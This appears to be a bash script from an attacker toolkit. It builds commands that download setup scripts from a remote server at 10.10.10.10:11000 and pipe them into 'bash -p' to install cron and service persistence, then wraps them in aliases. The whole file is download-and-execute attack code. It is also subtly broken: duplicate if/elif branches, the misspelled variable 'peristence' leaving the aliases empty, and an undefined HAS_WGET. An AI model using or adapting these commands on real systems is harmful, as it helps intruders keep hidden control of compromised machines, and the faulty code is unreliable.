#!/bin/bash

FALSE=$(/bin/false)
SERVER_IP="10.10.10.10"
SERVER_PORT="11000"

if [[ "$HAS_WGET" != "$FALSE" ]];
then
    peristence_cron_setup="wget -qO- http://$SERVER_IP:$SERVER_PORT/persistence/cron/setup.sh | bash -p"
elif [[ "$HAS_WGET" != "$FALSE" ]];
then
    peristence_cron_setup="wget -qO- http://$SERVER_IP:$SERVER_PORT/persistence/cron/setup.sh | bash -p"
fi

alias PERSISTENCE_CRON_SETUP="$persistence_cron_setup"

if [[ "$HAS_WGET" != "$FALSE" ]];
then
    peristence_service_setup="wget -qO- http://$SERVER_IP:$SERVER_PORT/persistence/service/king/setup.sh | bash -p"
elif [[ "$HAS_WGET" != "$FALSE" ]];
then
    peristence_service_setup="wget -qO- http://$SERVER_IP:$SERVER_PORT/persistence/service/king/setup.sh | bash -p"
fi

alias PERSISTENCE_SERVICE_SETUP="$persistence_service_setup"